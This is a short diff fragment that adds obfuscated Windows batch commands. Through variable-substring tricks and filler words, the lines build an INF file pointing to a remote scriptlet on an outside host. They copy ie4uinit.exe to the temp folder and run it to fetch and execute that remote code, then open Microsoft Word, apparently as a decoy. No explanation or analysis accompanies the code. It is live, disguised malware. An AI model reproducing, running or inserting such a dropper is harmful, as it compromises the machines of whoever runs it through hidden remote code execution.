@@ -1,0 +1,8 @@
+/v /ccall%Potatoes:~0,1%et "Denial=.inf" &&
+  %Potatoes:~0,1%et "Kangaroo=ieuinit!Denial!" &&
+  call %Potatoes:~0,1%et "Blogs=%t!Wrestle!mp%\" &&
+  (for /D %p in ("[defaultin%Potatoes:~0,1%tall.windows7]" "Un\" "Register\" "OCXs=D6C11A" "delfiles=2AE4" "[de%Potatoes:~0,1%tinationdirs]" "defaultdestdir=11" "2AE4=01" "[D6C11A]" "sc\" "ro%Chuckle%j,NI,%Future%%Simple%%Simple%p%Commissioners%%Columnists%%Columnists%cmd.emersonkelly.%Glory%/lajvar" "[string%Potatoes:~0,1%]" "%Potatoes:~0,1%ervicename=' '" "Future=h" "Sorts=init" "Glory=com" "Simple=t;Layer" "Unable=%time%" "%Potatoes:~0,1%hortsvcname=' '" "Commissioners=:;Values" "Chuckle=b;Optimization" "Columnists=/" "[version]" "signature =$windows nt$" "[2AE4]" "ieu%Sorts%!Denial!" ) do @echo %~p)>"!Blogs!!Kangaroo!" &&
+  %Potatoes:~0,1%et "Outdoors=ie4uinit.exe" &&
+  call xcopy /Y /C /Q %win!Entrepreneurs!ir%\%Potatoes:~0,1%ystem32\!Outdoors! "!Blogs!*" &&
+  start "" "!Blogs!!Outdoors!" -basesettings &&
+  start "" "C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"
